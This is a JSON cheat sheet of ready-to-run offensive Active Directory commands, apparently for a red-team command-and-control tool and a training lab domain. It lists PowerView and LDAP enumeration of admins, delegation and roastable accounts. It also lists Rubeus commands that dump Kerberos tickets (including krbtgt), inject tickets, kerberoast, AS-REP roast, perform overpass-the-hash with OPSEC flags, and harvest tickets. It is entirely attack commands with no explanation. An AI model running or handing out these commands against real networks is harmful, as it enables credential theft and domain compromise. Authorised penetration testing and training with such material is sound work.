{
  "Domain_Recon": {
    "Use PowerView for domain enumeration": "powershell-import C:\\Tools\\PowerSploit\\Recon\\PowerView.ps1",
    "Get Domain Information": "powerpick Get-Domain -Domain <>",
    "Get Domain SID": "powerpick Get-DomainSID",
    "Get Domain Controller": "powerpick Get-DomainController | select Forest, Name, OSVersion | fl",
    "Get Forest Information": "powerpick Get-ForestDomain -Forest <>",
    "Get Domain Policy": "powerpick Get-DomainPolicyData | select -expand SystemAccess",
    "Get Domain User (Specific)": "powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl",
    "Get User SPNs": "powerpick Get-DomainUser | select cn,serviceprincipalname",
    "Identify ASREP-Roastable Users": "powerpick Get-DomainUser -PreauthNotRequired",
    "Identify Users TrustedToAuth": "powerpick Get-DomainUser -TrustedToAuth",
    "Get Domain Computers": "powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName",
    "Identify Unconstrained Delegation Computers": "powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname",
    "Identify Computers TrustedToAuth": "powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto",
    "Get Domain OUs": "powerpick Get-DomainOU -Properties Name | sort -Property Name",
    "Identify Computers in OU": "powerpick Get-DomainComputer -SearchBase \"OU=Workstations,DC=dev,DC=cyberbotic,DC=io\" | select dnsHostName",
    "Get Domain Groups (Admins filter)": "powerpick Get-DomainGroup | where Name -like \"*Admins*\" | select SamAccountName",
    "Get Domain Group Members": "powerpick Get-DomainGroupMember -Identity \"Domain Admins\" | select MemberDistinguishedName",
    "Get Domain Group Members (Recursive)": "powerpick Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse | select MemberDistinguishedName",
    "Get Domain GPOs": "powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName",
    "Find Systems where GPO Applies": "powerpick Get-DomainOU -GPLink \"{GPO_LINK}\" | select distinguishedName",
    "Get Domain Trusts": "powerpick Get-DomainTrust",
    "Find Local Admin Access (Current User Context)": "powerpick Find-LocalAdminAccess",
    "Check Local Admin Access on Server": "powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>",
    "Invoke User Hunter": "powerpick Invoke-UserHunter",
    "Find PSRemoting Local Admin Access": "powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>",
    "Find WMI Local Admin Access": "powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>"
  },
  "AD_Search": {
    "Search - All Users": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"objectCategory=user\"",
    "Search - Groups (Admins filter)": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(&(objectCategory=group)(cn=*Admins*))\"",
    "Search - MS SQL Admins Group": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(&(objectCategory=group)(cn=MS SQL Admins))\" --attributes cn,member",
    "Kerberoastable Users": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(&(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName",
    "ASREP-Roastable Users": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" --attributes cn,distinguishedname,samaccountname",
    "Unconstrained Delegation Computers": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname",
    "Constrained Delegation Computers (JSON output)": "execute-assembly C:\\Tools\\ADSearch\\ADSearch\\bin\\Release\\ADSearch.exe --search \"(&(objectCategory=computer)(msds-allowedtodelegateto=*))\" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json"
  },
  "Rubeus": {
    "Dump All Tickets": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe dump",
    "Dump Tickets (Base64)": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe dump /nowrap",
    "Dump LSA Tickets (Elevated)": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe dump /service:krbtgt",
    "Inject Ticket": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe ptt /ticket:<ticket_file_or_b64>",
    "Inject Ticket (by LUID)": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe ptt /luid:<hex_luid> /ticket:<ticket_file_or_b64>",
    "ASREP-Roast User": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe asreproast /user:<user> /domain:<domain>",
    "ASREP-Roast Output to File": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe asreproast /outfile:<file_path>",
    "Kerberoast Basic": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe kerberoast",
    "Kerberoast Output to File": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe kerberoast /outfile:<file_path>",
    "Kerberoast OPSEC": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe kerberoast /rc4opsec /nowrap",
    "OverPass-The-Hash (RC4)": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe asktgt /user:<user> /ntlm:<rc4_hash> /domain:<domain> /nowrap",
    "OverPass-The-Hash (AES256, OPSEC)": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe asktgt /user:<user> /aes256:<aes_hash> /domain:<domain> /opsec /nowrap",
    "Request TGT": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe asktgt /user:<user> /rc4:<hash>",
    "Request TGS": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe tgtdeleg /target:<SPN>",
    "Renew Ticket": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe renew /ticket:<kirbi_file>",
    "Create Net-Only Logon": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe createnetonly /program:<program_path> /domain:<domain> /username:<user> /password:<pass>",
    "Create Net-Only Logon + Inject Ticket": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe createnetonly /program:<program_path> /domain:<domain> /username:<user> /password:<pass> /ticket:<ticket_file_or_b64>",
    "Harvest Tickets": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe harvest /interval:<seconds>",
    "Monitor for New Tickets": "execute-assembly C:\\Tools\\Rubeus\\Rubeus\\Bin\\Release\\rubeus.exe monitor /interval:<seconds>"
  }
}